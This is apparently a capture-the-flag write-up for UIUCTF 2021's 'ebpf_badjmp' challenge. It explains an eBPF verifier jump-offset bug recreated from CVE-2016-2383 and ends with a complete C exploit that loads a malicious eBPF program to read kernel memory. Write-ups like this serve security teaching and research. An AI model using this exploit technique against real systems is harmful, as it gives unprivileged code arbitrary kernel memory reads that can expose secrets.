# UIUCTF 2021: ebpf_badjmp solution  
Decription:  
>We recreated CVE-2016-2383. Your task is to read out the variable named
`uiuctf_flag`  in the kernel memory, by building an arbitrary kernel memory
read via a malicious eBPF program. Use of provided starter code is optional;
if you have better methods feel free to use them instead.  
>  
>`$ stty raw -echo; nc bpf-badjmp.chal.uiuc.tf 1337; stty -raw echo`  
>  
>Upload large files to VM:  `$ nc bpf-badjmp.chal.uiuc.tf 1338 < file`  
>  
>HINT: How do you create a backwards jump without introducing unreachable code
or creating loops?

## The Vulnerability  
Here we're given the patch which will introduce bug in eBPF kernel subsystem.  
``` diff  
diff --git a/kernel/bpf/core.c b/kernel/bpf/core.c  
index 75244ecb2389..277f0e475181 100644  
--- a/kernel/bpf/core.c  
+++ b/kernel/bpf/core.c  
@@ -56,6 +56,8 @@  
#define CTX    regs[BPF_REG_CTX]  
#define IMM    insn->imm

+char uiuctf_flag[4096] __attribute__((used, aligned(4096))) =
"uiuctf{xxxxxxxxxxxxxxxxxxxxxxxxxx}";  
+  
/* No hurry in this branch  
 *  
 * Exported for the bpf jit load helper.  
@@ -366,7 +368,7 @@ static int bpf_adj_delta_to_off(struct bpf_insn *insn, u32
pos, s32 end_old,

       if (curr < pos && curr + off + 1 >= end_old)  
               off += delta;  
-       else if (curr >= end_new && curr + off + 1 < end_new)  
+       else if (curr > pos && curr + off + 1 < pos)  
               off -= delta;  
       if (off < off_min || off > off_max)  
               return -ERANGE;  
```  
This patch will introduce the bug which will have same implication with
CVE-2016-2823, you can see in this
[commit](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=a1b14d27ed0965838350f1377ff97c93ee383492)
the author explains clearly about why this code is wrong and how to trigger
the bug, i will explain a little here.

When we load eBPF program to kernel, the kernel can expand and patch some eBPF
instruction, internally it will rewrite the instruction using
[`bpf_patch_insn_data`](https://github.com/gregkh/linux/blob/linux-5.12.y/kernel/bpf/verifier.c#L10894),
this function will patch instruction at offset `off` with instruction `patch`
with some length defined in `len` variable. One instruction can be rewritten
by multiple instruction. Another thing that kernel need to take care is that
`BPF_JMP` instruction, store the destination address by the relative offset
with its instruction address, just like `jmp` instruction in x86 assembly. So,
if there are instruction will be patched by multiple instruction the
destination of some `BPF_JMP` instruction will be wrong, and kernel need to
fix that using `bpf_adj_delta_to_off` instruction. If you see the code flow
from `bpf_patch_insn_data` it can go through `bpf_adj_delta_to_off` and fix
the offset of the `BPF_JMP` instruction there.

What's the problem with the code? I just quote from the commit author here,
and i will try re-explain  
```  
Analysis on what the check in adjust_branches() is currently doing:

 /* adjust offset of jmps if necessary */  
 if (i < pos && i + insn->off + 1 > pos)  
   insn->off += delta;  
 else if (i > pos && i + insn->off + 1 < pos)  
   insn->off -= delta;

First condition (forward jumps):

 Before:                         After:

 insns[0]                        insns[0]  
 insns[1] <--- i/insn            insns[1] <--- i/insn  
 insns[2] <--- pos               insns[P] <--- pos  
 insns[3]                        insns[P]  `------| delta  
 insns[4] <--- target_X          insns[P]   `-----|  
 insns[5]                        insns[3]  
                                 insns[4] <--- target_X  
                                 insns[5]

First case is if we cross pos-boundary and the jump instruction was  
before pos. This is handeled correctly. I.e. if i == pos, then this  
would mean our jump that we currently check was the patchlet itself  
that we just injected. Since such patchlets are self-contained and  
have no awareness of any insns before or after the patched one, the  
delta is correctly not adjusted. Also, for the second condition in  
case of i + insn->off + 1 == pos, means we jump to that newly patched  
instruction, so no offset adjustment are needed. That part is correct.  
```  
In this case, the author mention for the forward jumps, and the destination
jump is after the expanded instruction, you can see above the expanded
instruction is marked by `insns[P]`, `delta` is the length of new patched
instruction.

```  
Second condition (backward jumps):

 Before:                         After:

 insns[0]                        insns[0]  
 insns[1] <--- target_X          insns[1] <--- target_X  
 insns[2] <--- pos <-- target_Y  insns[P] <--- pos <-- target_Y  
 insns[3]                        insns[P]  `------| delta  
 insns[4] <--- i/insn            insns[P]   `-----|  
 insns[5]                        insns[3]  
                                 insns[4] <--- i/insn  
                                 insns[5]

Second interesting case is where we cross pos-boundary and the jump  
instruction was after pos. Backward jump with i == pos would be  
impossible and pose a bug somewhere in the patchlet, so the first  
condition checking i > pos is okay only by itself. However, i +  
insn->off + 1 < pos does not always work as intended to trigger the  
adjustment. It works when jump targets would be far off where the  
delta wouldn't matter. But, for example, where the fixed insn->off  
before pointed to pos (target_Y), it now points to pos + delta, so  
that additional room needs to be taken into account for the check.  
This means that i) both tests here need to be adjusted into pos + delta,  
and ii) for the second condition, the test needs to be <= as pos  
itself can be a target in the backjump, too.  
```  
In second case, for backward jumps, this is where this function fails. This
function only adjust the offset of the jump if the destination of the jump is
before the newly patched instruction, so because it's not adjust the offset of
the jump, we can using this bug to make jump to the middle of the patched
instruction.

## The Exploit  
To trigger the bug, we need to create backward jumps. I thought it was easy to
create backward jump, first idea came out to my mind is to make bounded loop.
Yes, eBPF is already support bounded loop in newer kernel, but turns out only
priv user is allowed to create bounded loop. After thinking for hours i can
solve this, this is the sample code to make backward jumps without bounded
loops  
```  
               ...  
       .--<    BPF_JMP_IMM(BPF_JLE, BPF_REG_7, 4, 25), // assume BPF_REG_7 is zero, comes from map value  
       |       BPF_MOV64_IMM(BPF_REG_0, 0x0),  
       |       BPF_EXIT_INSN(),  
       |       ...                                      <--.  
       |       ...                                         |  
       |       BPF_MOV64_IMM(BPF_REG_0, 0x0),              |  
       |       BPF_EXIT_INSN(),                            |  
       '-->    BPF_JMP_IMM(BPF_JLE, BPF_REG_7, 4, -24), >--'  
               BPF_MOV64_IMM(BPF_REG_0, 0),  
               BPF_EXIT_INSN(),  
```  
This is how backward jumps looks like, `BPF_REG_7` is just dummy value to make
the jump works, we make the jump is always true by making `BPF_REG_7` is zero,
make sure is coming from map value not from constant, otherwise eBPF can
remove the jump for optimization, just to make sure.

So we have backward jump already, the other thing we need is BPF instruction
that can expand in the kernel. To find this i just do some references on
`bpf_patch_insn_data`, here's the result.  
```  
Cscope tag: bpf_patch_insn_data  
  #   line  filename / context / line  
  1  11253  /home/n0p/research/kernel/linux-5.12.13/kernel/bpf/verifier.c
<<opt_subreg_zext_lo32_rnd_hi32>>  
            new_prog = bpf_patch_insn_data(env, adj_idx, patch, patch_len);  
  2  11292  /home/n0p/research/kernel/linux-5.12.13/kernel/bpf/verifier.c
<<convert_ctx_accesses>>  
            new_prog = bpf_patch_insn_data(env, 0, insn_buf, cnt);  
  3  11340  /home/n0p/research/kernel/linux-5.12.13/kernel/bpf/verifier.c
<<convert_ctx_accesses>>  
            new_prog = bpf_patch_insn_data(env, i + delta, patch, cnt);  
  4  11438  /home/n0p/research/kernel/linux-5.12.13/kernel/bpf/verifier.c
<<convert_ctx_accesses>>  
            new_prog = bpf_patch_insn_data(env, i + delta, insn_buf, cnt);  
  5  11765  /home/n0p/research/kernel/linux-5.12.13/kernel/bpf/verifier.c
<<fixup_bpf_calls>>  
            new_prog = bpf_patch_insn_data(env, i + delta, patchlet, cnt);  
  6  11784  /home/n0p/research/kernel/linux-5.12.13/kernel/bpf/verifier.c
<<fixup_bpf_calls>>  
            new_prog = bpf_patch_insn_data(env, i + delta, insn_buf, cnt);  
  7  11837  /home/n0p/research/kernel/linux-5.12.13/kernel/bpf/verifier.c
<<fixup_bpf_calls>>  
            new_prog = bpf_patch_insn_data(env, i + delta, insn_buf, cnt);  
  8  11923  /home/n0p/research/kernel/linux-5.12.13/kernel/bpf/verifier.c
<<fixup_bpf_calls>>  
            new_prog = bpf_patch_insn_data(env, i + delta, insn_buf, cnt);  
  9  11960  /home/n0p/research/kernel/linux-5.12.13/kernel/bpf/verifier.c
<<fixup_bpf_calls>>  
            new_prog = bpf_patch_insn_data(env, i + delta,  
 10  12029  /home/n0p/research/kernel/linux-5.12.13/kernel/bpf/verifier.c
<<fixup_bpf_calls>>  
            new_prog = bpf_patch_insn_data(env, i + delta, insn_buf,  
```  
We just need to choose one that fit for our exploitation case. Talking about
expanded instruction, i remember article that i read a few days ago about eBPF
exploitation, it was a good read written by @chompie1337, you can read the
article [here](https://www.graplsecurity.com/post/kernel-pwning-with-ebpf-a-
love-story). In the article she mention about ALU sanitation that can patched
instruction that involve arithmetic on pointer, i just quoted here below from
her blog.

> ### **ALU Sanitation**  
>  
>ALU Sanitation is a feature that was introduced to supplement the static
range tracking of the verifier. The idea is to prevent OOB memory accesses if
the value of registers do not fall within their expected range during runtime.
This was added to help mitigate potential vulnerabilities in the verifier and
protect against speculative attacks.  
>  
>For every arithmetic operation that involves a pointer and a scalar register,
an alu_limit is calculated. This represents the maximum absolute value that
can be added to or subtracted from the pointer
[[4]](https://www.zerodayinitiative.com/blog/2020/4/8/cve-2020-8835-linux-
kernel-privilege-escalation-via-improper-ebpf-program-verification). Before
each of these operations, the bytecode is patched with the following
instructions:  
>  
>*patch++ = BPF_MOV32_IMM(BPF_REG_AX, aux->alu_limit);  
*patch++ = BPF_ALU64_REG(BPF_SUB, BPF_REG_AX, off_reg);  
*patch++ = BPF_ALU64_REG(BPF_OR, BPF_REG_AX, off_reg);  
*patch++ = BPF_ALU64_IMM(BPF_NEG, BPF_REG_AX, 0);  
*patch++ = BPF_ALU64_IMM(BPF_ARSH, BPF_REG_AX, 63);  
*patch++ = BPF_ALU64_REG(BPF_AND, BPF_REG_AX, off_reg);  
>  
>Note that off_reg represents the scalar register being added to the pointer
register, and BPF_REG_AUX represents the auxiliary register.

This patch is just to make sure the scalar value that will added to pointer
during runtime will not make an OOB access, you can read more detail from her
blog. This below is snippet code where the patch happens, it will call
`bpf_patch_insn_data` to apply the patch  
``` c  
static int fixup_bpf_calls(struct bpf_verifier_env *env)  
{  
	...  
	for (i = 0; i < insn_cnt; i++, insn++) {  
		...  
		if (insn->code == (BPF_ALU64 | BPF_ADD | BPF_X) ||  
		    insn->code == (BPF_ALU64 | BPF_SUB | BPF_X)) {  
			const u8 code_add = BPF_ALU64 | BPF_ADD | BPF_X;  
			const u8 code_sub = BPF_ALU64 | BPF_SUB | BPF_X;  
			struct bpf_insn insn_buf[16];  
			struct bpf_insn *patch = &insn_buf[0];  
			bool issrc, isneg, isimm;  
			u32 off_reg;

			aux = &env->insn_aux_data[i + delta];  
			if (!aux->alu_state ||  
			    aux->alu_state == BPF_ALU_NON_POINTER)  
				continue;

			isneg = aux->alu_state & BPF_ALU_NEG_VALUE;  
			issrc = (aux->alu_state & BPF_ALU_SANITIZE) ==  
				BPF_ALU_SANITIZE_SRC;  
			isimm = aux->alu_state & BPF_ALU_IMMEDIATE;

			off_reg = issrc ? insn->src_reg : insn->dst_reg;  
			if (isimm) {  
				*patch++ = BPF_MOV32_IMM(BPF_REG_AX, aux->alu_limit);  
			} else {  
				if (isneg)  
					*patch++ = BPF_ALU64_IMM(BPF_MUL, off_reg, -1);  
				*patch++ = BPF_MOV32_IMM(BPF_REG_AX, aux->alu_limit);  
				*patch++ = BPF_ALU64_REG(BPF_SUB, BPF_REG_AX, off_reg);  
				*patch++ = BPF_ALU64_REG(BPF_OR, BPF_REG_AX, off_reg);  
				*patch++ = BPF_ALU64_IMM(BPF_NEG, BPF_REG_AX, 0);  
				*patch++ = BPF_ALU64_IMM(BPF_ARSH, BPF_REG_AX, 63);  
				*patch++ = BPF_ALU64_REG(BPF_AND, BPF_REG_AX, off_reg);  
			}  
			if (!issrc)  
				*patch++ = BPF_MOV64_REG(insn->dst_reg, insn->src_reg);  
			insn->src_reg = BPF_REG_AX;  
			if (isneg)  
				insn->code = insn->code == code_add ?  
					     code_sub : code_add;  
			*patch++ = *insn;  
			if (issrc && isneg && !isimm)  
				*patch++ = BPF_ALU64_IMM(BPF_MUL, off_reg, -1);  
			cnt = patch - insn_buf;

			new_prog = bpf_patch_insn_data(env, i + delta, insn_buf, cnt);  
			if (!new_prog)  
				return -ENOMEM;

			delta    += cnt - 1;  
			env->prog = prog = new_prog;  
			insn      = new_prog->insnsi + i + delta;  
			continue;  
		}  
		...  
	...  
	}  
```  
Consider the following eBPF instruction, where `BPF_REG_0` is pointer to map
value, and `BPF_REG_7` is some scalar unknown value coming from bpf map, in
reality it's just zero value (this is the same `BPF_REG_7` that we talked
before actually) .  
```c  
		BPF_ALU64_REG(BPF_ADD, BPF_REG_0, BPF_REG_7),  
```  
Above instruction, will expanded to:  
```c  
		BPF_MOV32_IMM(BPF_REG_AX, aux->alu_limit);  
		BPF_ALU64_REG(BPF_SUB, BPF_REG_AX, BPF_REG_7);  
		BPF_ALU64_REG(BPF_OR, BPF_REG_AX, BPF_REG_7);  
		BPF_ALU64_IMM(BPF_NEG, BPF_REG_AX, 0);  
		BPF_ALU64_IMM(BPF_ARSH, BPF_REG_AX, 63);  
		BPF_ALU64_REG(BPF_AND, BPF_REG_AX, BPF_REG_7);  
		BPF_ALU64_REG(BPF_ADD, BPF_REG_0, BPF_REG_AX),  
```  
So, this one instruction will be patched with seven instruction.

My idea is using this expanded instruction, i want to make this load arbitrary
pointer (we want to take control over `BPF_REG_0` registers). This is what it
looks like.  
``` c  
       BPF_JMP_IMM(BPF_JLE, BPF_REG_7, 4, 11), // goto jmp1  
       BPF_MOV64_IMM(BPF_REG_0, 0x0),  
       BPF_EXIT_INSN(),  
       // jmp2: // [1]  
       BPF_MOV64_REG(BPF_REG_0, BPF_REG_5), // suppose BPF_REG_5 is pointer to map value  
       BPF_MOV64_REG(BPF_REG_7, BPF_REG_7), // just some nop  
       BPF_MOV64_REG(BPF_REG_7, BPF_REG_7),  
       BPF_MOV64_REG(BPF_REG_7, BPF_REG_7),  
       BPF_MOV64_REG(BPF_REG_7, BPF_REG_7),  
       BPF_MOV64_REG(BPF_REG_7, BPF_REG_7),  
                                                     // expanded instruction here  
       BPF_ALU64_REG(BPF_ADD, BPF_REG_0, BPF_REG_7), /*BPF_MOV32_IMM(BPF_REG_AX, aux->alu_limit),  
                                                       BPF_ALU64_REG(BPF_SUB, BPF_REG_AX, BPF_REG_7),  
                                                       BPF_ALU64_REG(BPF_OR, BPF_REG_AX, BPF_REG_7),  
                                                       BPF_ALU64_IMM(BPF_NEG, BPF_REG_AX, 0),  
                                                       BPF_ALU64_IMM(BPF_ARSH, BPF_REG_AX, 63),  
                                                       BPF_ALU64_REG(BPF_AND, BPF_REG_AX, BPF_REG_7),  
                                                       BPF_ALU64_REG(BPF_ADD, BPF_REG_0, BPF_REG_AX),*/  
  
       BPF_MOV64_IMM(BPF_REG_0, 0x0),  
       BPF_EXIT_INSN(),  
       // jmp1:  
       BPF_JMP_IMM(BPF_JLE, BPF_REG_7, 4, -10), // goto jmp2  
```  
First we create backward jump with the technique we talked before, we jump to
`jmp2:` from `jmp1:`. Suppose `BPF_REG_5` is pointer to map value, and it is
stored to `BPF_REG_0`. There's some `nop` instruction, i will explain that
later, after that arithmetic operation that involve scalar with pointer will
expanded by kernel, it will expanded to seven instruction. If you apply the
patch, and count the offset `-10` from `jmp1:`, it will resides right at the
expanded instruction!. Because of the bug, after instruction expanded, the
offset of the jump not changed. Instead of jump to the `jmp2:` which will
store `BPF_REG_0` with valid pointer value, it will just jump into expanded
instruction with invalid value in `BPF_REG_0`, we can just control `BPF_REG_0`
at the start, and after expanded instruction finish, it will treat `BPF_REG_0`
as valid pointer even though it's the controlled value in runtime!. Now you
know why i put 5 nop instruction right there, it is just to make distance to
valid destination offset and distance to expanded instruction is the same, so
we make verifier believe we get `BPF_REG_0` is valid from `BPF_REG_5`, but in
runtime we just jump into the expanded instruction.

We're almost done, we just need to set `BPF_REG_0` to kernel address of
`uiuctf_flag`, and we just use BPF instruction to read `BPF_REG_0` and copy to
our bpf map to get the flag. The author of the challenge make our work easier
to make `/proc/kallsyms` readable from unpriv user, so we can use
`/proc/kallsyms` to get address of `uiuctf_flag`. This is my full exploit
code:  
``` c  
#define _GNU_SOURCE  
#include <sched.h>  
#include <stdio.h>  
#include <fcntl.h>  
#include <stdlib.h>  
#include <unistd.h>  
#include <sys/ioctl.h>  
#include <errno.h>  
#include <pthread.h>  
#include <sys/wait.h>  
#include <linux/bpf.h>  
#include <sys/mman.h>  
#include <string.h>  
#include <stdint.h>  
#include <stdarg.h>  
#include <sys/socket.h>  
#include <linux/if_ether.h>  
#include <linux/ip.h>  
#include <stddef.h>  
#include <sys/stat.h>

#ifndef __NR_BPF  
#define __NR_BPF 321  
#endif  
#define ptr_to_u64(ptr) ((__u64)(unsigned long)(ptr))

#define BPF_RAW_INSN(CODE, DST, SRC, OFF, IMM) \  
	((struct bpf_insn){                        \  
	 .code = CODE,                          \  
	 .dst_reg = DST,                        \  
	 .src_reg = SRC,                        \  
	 .off = OFF,                            \  
	 .imm = IMM})

#define BPF_LD_IMM64_RAW(DST, SRC, IMM)    \  
	((struct bpf_insn){                    \  
	 .code = BPF_LD | BPF_DW | BPF_IMM, \  
	 .dst_reg = DST,                    \  
	 .src_reg = SRC,                    \  
	 .off = 0,                          \  
	 .imm = (__u32)(IMM)}),             \  
	 ((struct bpf_insn){                \  
		.code = 0,                     \  
		.dst_reg = 0,                  \  
		.src_reg = 0,                  \  
		.off = 0,                      \  
		.imm = ((__u64)(IMM)) >> 32})

#define BPF_MOV64_IMM(DST, IMM) BPF_RAW_INSN(BPF_ALU64 | BPF_MOV | BPF_K, DST, 0, 0, IMM)

#define BPF_MOV_REG(DST, SRC) BPF_RAW_INSN(BPF_ALU | BPF_MOV | BPF_X, DST, SRC, 0, 0)

#define BPF_MOV64_REG(DST, SRC) BPF_RAW_INSN(BPF_ALU64 | BPF_MOV | BPF_X, DST, SRC, 0, 0)

#define BPF_MOV_IMM(DST, IMM) BPF_RAW_INSN(BPF_ALU | BPF_MOV | BPF_K, DST, 0, 0, IMM)

#define BPF_RSH_REG(DST, SRC) BPF_RAW_INSN(BPF_ALU64 | BPF_RSH | BPF_X, DST, SRC, 0, 0)

#define BPF_LSH_IMM(DST, IMM) BPF_RAW_INSN(BPF_ALU64 | BPF_LSH | BPF_K, DST, 0, 0, IMM)

#define BPF_ALU64_IMM(OP, DST, IMM) BPF_RAW_INSN(BPF_ALU64 | BPF_OP(OP) | BPF_K, DST, 0, 0, IMM)

#define BPF_ALU64_REG(OP, DST, SRC) BPF_RAW_INSN(BPF_ALU64 | BPF_OP(OP) | BPF_X, DST, SRC, 0, 0)

#define BPF_ALU_IMM(OP, DST, IMM) BPF_RAW_INSN(BPF_ALU | BPF_OP(OP) | BPF_K, DST, 0, 0, IMM)

#define BPF_JMP_IMM(OP, DST, IMM, OFF) BPF_RAW_INSN(BPF_JMP | BPF_OP(OP) | BPF_K, DST, 0, OFF, IMM)

#define BPF_JMP_REG(OP, DST, SRC, OFF) BPF_RAW_INSN(BPF_JMP | BPF_OP(OP) | BPF_X, DST, SRC, OFF, 0)

#define BPF_JMP32_REG(OP, DST, SRC, OFF) BPF_RAW_INSN(BPF_JMP32 | BPF_OP(OP) | BPF_X, DST, SRC, OFF, 0)

#define BPF_JMP32_IMM(OP, DST, IMM, OFF) BPF_RAW_INSN(BPF_JMP32 | BPF_OP(OP) | BPF_K, DST, 0, OFF, IMM)

#define BPF_EXIT_INSN() BPF_RAW_INSN(BPF_JMP | BPF_EXIT, 0, 0, 0, 0)

#define BPF_LD_MAP_FD(DST, MAP_FD) BPF_LD_IMM64_RAW(DST, BPF_PSEUDO_MAP_FD,
MAP_FD)

#define BPF_LD_IMM64(DST, IMM) BPF_LD_IMM64_RAW(DST, 0, IMM)

#define BPF_ST_MEM(SIZE, DST, OFF, IMM) BPF_RAW_INSN(BPF_ST | BPF_SIZE(SIZE) | BPF_MEM, DST, 0, OFF, IMM)

#define BPF_LDX_MEM(SIZE, DST, SRC, OFF) BPF_RAW_INSN(BPF_LDX | BPF_SIZE(SIZE) | BPF_MEM, DST, SRC, OFF, 0)

#define BPF_STX_MEM(SIZE, DST, SRC, OFF) BPF_RAW_INSN(BPF_STX | BPF_SIZE(SIZE) | BPF_MEM, DST, SRC, OFF, 0)

int doredact = 0;  
#define LOG_BUF_SIZE 65536  
char bpf_log_buf[LOG_BUF_SIZE];  
char buffer[64];  
int sockets[2];  
int sockets2[2];  
int mapfd;  
int _mapfd[0x1000];  
size_t _offset = 0;  
void fail(const char *fmt, ...)  
{  
	va_list args;  
	va_start(args, fmt);  
	fprintf(stdout, "[!] ");  
	vfprintf(stdout, fmt, args);  
	va_end(args);  
	exit(1);  
}

void msg(const char *fmt, ...)  
{  
	va_list args;  
	va_start(args, fmt);  
	fprintf(stdout, "[*] ");  
	vfprintf(stdout, fmt, args);  
	va_end(args);  
}

int bpf_create_map(enum bpf_map_type map_type,  
		unsigned int key_size,  
		unsigned int value_size,  
		unsigned int max_entries,  
		unsigned int map_fd)  
{  
	union bpf_attr attr = {  
		.map_type = map_type,  
		.key_size = key_size,  
		.value_size = value_size,  
		.max_entries = max_entries,  
		.inner_map_fd = map_fd};

	return syscall(__NR_BPF, BPF_MAP_CREATE, &attr, sizeof(attr));  
}

int bpf_create_map_node(enum bpf_map_type map_type,  
		unsigned int key_size,  
		unsigned int value_size,  
		unsigned int max_entries,  
		unsigned int map_fd,  
		unsigned int node)  
{  
	union bpf_attr attr = {  
		.map_type = map_type,  
		.key_size = key_size,  
		.value_size = value_size,  
		.max_entries = max_entries,  
		.inner_map_fd = map_fd,  
		.numa_node = node,  
		.map_flags = BPF_F_NUMA_NODE  
	};

	return syscall(__NR_BPF, BPF_MAP_CREATE, &attr, sizeof(attr));  
}

int bpf_obj_get_info_by_fd(int fd, const unsigned int info_len, void *info)  
{  
	union bpf_attr attr;  
	memset(&attr, 0, sizeof(attr));  
	attr.info.bpf_fd = fd;  
	attr.info.info_len = info_len;  
attr.info.info = ptr_to_u64(info);  
	return syscall(__NR_BPF, BPF_OBJ_GET_INFO_BY_FD, &attr, sizeof(attr));  
}

int bpf_lookup_elem(int fd, const void *key, void *value)  
{  
	union bpf_attr attr = {  
		.map_fd = fd,  
		.key = ptr_to_u64(key),  
		.value = ptr_to_u64(value),  
	};

	return syscall(__NR_BPF, BPF_MAP_LOOKUP_ELEM, &attr, sizeof(attr));  
}

int bpf_update_elem(int fd, const void *key, const void *value,  
		uint64_t flags)  
{  
	union bpf_attr attr = {  
		.map_fd = fd,  
		.key = ptr_to_u64(key),  
		.value = ptr_to_u64(value),  
		.flags = flags,  
	};

	return syscall(__NR_BPF, BPF_MAP_UPDATE_ELEM, &attr, sizeof(attr));  
}

int bpf_prog_load(enum bpf_prog_type type,  
		const struct bpf_insn *insns, int insn_cnt,  
		const char *license)  
{  
	union bpf_attr attr = {  
		.prog_type = type,  
		.insns = ptr_to_u64(insns),  
		.insn_cnt = insn_cnt,  
		.license = ptr_to_u64(license),  
		.log_buf = ptr_to_u64(bpf_log_buf),  
		.log_size = LOG_BUF_SIZE,  
		.log_level = 3,  
	};

	return syscall(__NR_BPF, BPF_PROG_LOAD, &attr, sizeof(attr));  
}

#define BPF_LD_ABS(SIZE, IMM)                      \  
	((struct bpf_insn){                            \  
	 .code = BPF_LD | BPF_SIZE(SIZE) | BPF_ABS, \  
	 .dst_reg = 0,                              \  
	 .src_reg = 0,                              \  
	 .off = 0,                                  \  
	 .imm = IMM})

#define BPF_MAP_GET(idx, dst)                                                \  
	BPF_MOV64_REG(BPF_REG_1, BPF_REG_9),                                     \  
	BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),                                \  
	BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),                               \  
	BPF_ST_MEM(BPF_W, BPF_REG_10, -4, idx),                              \  
	BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem), \  
	BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),                               \  
	BPF_EXIT_INSN(),                                                     \  
	BPF_LDX_MEM(BPF_DW, dst, BPF_REG_0, 0),                              \  
	BPF_MOV64_IMM(BPF_REG_0, 0)

#define BPF_MAP_GET_ADDR(idx, dst)
\  
	BPF_MOV64_REG(BPF_REG_1, BPF_REG_9),                                     \  
	BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),                                \  
	BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),                               \  
	BPF_ST_MEM(BPF_W, BPF_REG_10, -4, idx),                              \  
	BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem), \  
	BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),                               \  
	BPF_EXIT_INSN(),                                                     \  
	BPF_MOV64_REG((dst), BPF_REG_0),                              \  
	BPF_MOV64_IMM(BPF_REG_0, 0)

int load_prog(uint64_t addr)  
{  
	struct bpf_insn prog[] = {  
		BPF_LD_MAP_FD(BPF_REG_9, _mapfd[0]),  
		BPF_MAP_GET(0, BPF_REG_7),  
		BPF_MAP_GET_ADDR(0, BPF_REG_8),

		BPF_MAP_GET_ADDR(0, BPF_REG_5),

		BPF_LD_IMM64_RAW(BPF_REG_0, 0, addr),  
		BPF_JMP_IMM(BPF_JLE, BPF_REG_7, 4, 25), // goto jmp1  
		BPF_MOV64_IMM(BPF_REG_0, 0x0),  
		BPF_EXIT_INSN(),

		BPF_MOV64_REG(BPF_REG_0, BPF_REG_5),  
		BPF_MOV64_REG(BPF_REG_7, BPF_REG_7),  
		BPF_MOV64_REG(BPF_REG_7, BPF_REG_7),  
		BPF_MOV64_REG(BPF_REG_7, BPF_REG_7),  
		BPF_MOV64_REG(BPF_REG_7, BPF_REG_7),  
		BPF_MOV64_REG(BPF_REG_7, BPF_REG_7),

		BPF_ALU64_REG(BPF_ADD, BPF_REG_0, BPF_REG_7),  
		// expanded instruction here  
		// BPF_MOV32_IMM(BPF_REG_AX, aux->alu_limit),  
		// BPF_ALU64_REG(BPF_SUB, BPF_REG_AX, BPF_REG_7),  
		// BPF_ALU64_REG(BPF_OR, BPF_REG_AX, BPF_REG_7),  
		// BPF_ALU64_IMM(BPF_NEG, BPF_REG_AX, 0),  
		// BPF_ALU64_IMM(BPF_ARSH, BPF_REG_AX, 63),  
		// BPF_ALU64_REG(BPF_AND, BPF_REG_AX, BPF_REG_7),  
		// BPF_ALU64_REG(BPF_ADD, BPF_REG_0, BPF_REG_AX),  
		//  
		BPF_LDX_MEM(BPF_DW, BPF_REG_6, BPF_REG_0, 0x0),  
		BPF_STX_MEM(BPF_DW, BPF_REG_8, BPF_REG_6, 0x0),  
		BPF_LDX_MEM(BPF_DW, BPF_REG_6, BPF_REG_0, 0x8),  
		BPF_STX_MEM(BPF_DW, BPF_REG_8, BPF_REG_6, 0x8),  
		BPF_LDX_MEM(BPF_DW, BPF_REG_6, BPF_REG_0, 0xc),  
		BPF_STX_MEM(BPF_DW, BPF_REG_8, BPF_REG_6, 0xc),  
		BPF_LDX_MEM(BPF_DW, BPF_REG_6, BPF_REG_0, 0x10),  
		BPF_STX_MEM(BPF_DW, BPF_REG_8, BPF_REG_6, 0x10),  
		BPF_LDX_MEM(BPF_DW, BPF_REG_6, BPF_REG_0, 0x18),  
		BPF_STX_MEM(BPF_DW, BPF_REG_8, BPF_REG_6, 0x18),  
		BPF_LDX_MEM(BPF_DW, BPF_REG_6, BPF_REG_0, 0x20),  
		BPF_STX_MEM(BPF_DW, BPF_REG_8, BPF_REG_6, 0x20),  
		BPF_LDX_MEM(BPF_DW, BPF_REG_6, BPF_REG_0, 0x28),  
		BPF_STX_MEM(BPF_DW, BPF_REG_8, BPF_REG_6, 0x28),

		BPF_MOV64_IMM(BPF_REG_0, 0x0),  
		BPF_EXIT_INSN(),  
		BPF_JMP_IMM(BPF_JLE, BPF_REG_7, 4, -24), // jmp1: goto jmp2

		BPF_MOV64_IMM(BPF_REG_0, 0),  
		BPF_EXIT_INSN(),  
	};  
	return bpf_prog_load(BPF_PROG_TYPE_SOCKET_FILTER, prog, sizeof(prog) / sizeof(struct bpf_insn), "GPL");  
}

int write_msg(int fd)  
{  
	ssize_t n = write(fd, buffer, sizeof(buffer));  
	if (n < 0)  
	{  
		perror("write");  
		return 1;  
	}  
	if (n != sizeof(buffer))  
	{  
		fprintf(stderr, "short write: %ld\n", n);  
	}  
	return 0;  
}

void update_elem(int key, size_t val)  
{  
	if (bpf_update_elem(mapfd, &key, &val, 0)) {  
		fail("bpf_update_elem failed '%s'\n", strerror(errno));  
	}  
}

size_t get_elem(int fd, int key)  
{  
	size_t val;  
	if (bpf_lookup_elem(fd, &key, &val)) {  
		fail("bpf_lookup_elem failed '%s'\n", strerror(errno));  
	}  
	return val;  
}

int main(int argc,char** argv)  
{  
	_mapfd[0] = bpf_create_map(BPF_MAP_TYPE_ARRAY,4,0x40,0x10,0);  
	_mapfd[1] = bpf_create_map(BPF_MAP_TYPE_ARRAY,4,0x40,0x10,0);  
	uint64_t result=0;  
	int key;  
	char buf[0x80] = {0};  
	uint64_t addr = strtoul(argv[1], NULL, 16);  
	int progfd = load_prog(addr);  
	if (progfd < 0)  
	{  
		if (errno == EACCES)  
		{  
			msg("log:\n%s", bpf_log_buf);  
		}  
		printf("%s\n", bpf_log_buf);  
		fail("failed to load prog '%s'\n", strerror(errno));  
	}  
	printf("loaded\n");

	if (socketpair(AF_UNIX, SOCK_DGRAM, 0, sockets))  
	{  
		fail("failed to create socket pair '%s'\n", strerror(errno));  
	}

	if (setsockopt(sockets[1], SOL_SOCKET, SO_ATTACH_BPF, &progfd, sizeof(progfd)) < 0)  
	{  
		fail("setsockopt '%s'\n", strerror(errno));  
	}

	write_msg(sockets[0]);  
	printf("Done\n");  
	key = 0;  
	bpf_lookup_elem(_mapfd[0], &key, &buf;;  
	printf("res: %s\n", buf);  
}  
```  
Run to remote server using script, and get the flag.  
```bash  
➜  bpf_badjmp git:(master) ✗ ./build.sh  
➜  bpf_badjmp git:(master) ✗ python3 send.py  
